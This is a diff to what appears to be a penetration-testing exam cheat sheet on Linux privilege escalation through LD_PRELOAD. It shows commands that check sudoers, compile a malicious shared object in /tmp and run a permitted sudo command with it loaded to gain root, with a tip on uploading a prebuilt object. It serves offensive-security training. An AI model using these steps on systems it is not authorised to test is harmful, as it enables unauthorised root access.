@@ -2,6 +2,8 @@
 
 **Run this when:** `sudo -l` keeps `LD_PRELOAD` in `env_keep`, or `/etc/ld.so.preload` is writable.
 
+**Optional.** Safe to skip under exam time pressure.
+
 ```bash
 sudo -n -l 2>/dev/null
 grep -R 'LD_PRELOAD' /etc/sudoers /etc/sudoers.d 2>/dev/null
@@ -20,5 +22,7 @@ EOF
 gcc -shared -fPIC -o /tmp/owb.so /tmp/owb.c
 sudo LD_PRELOAD=/tmp/owb.so <ALLOWED_COMMAND>
 ```
+
+If `gcc` is absent on the target, build the `.so` on Kali for the same architecture and upload it with [XFER-01](./xfer-01).
 
 For `/etc/ld.so.preload`, add the path and run any root-consumed binary. Remove the entry afterwards.
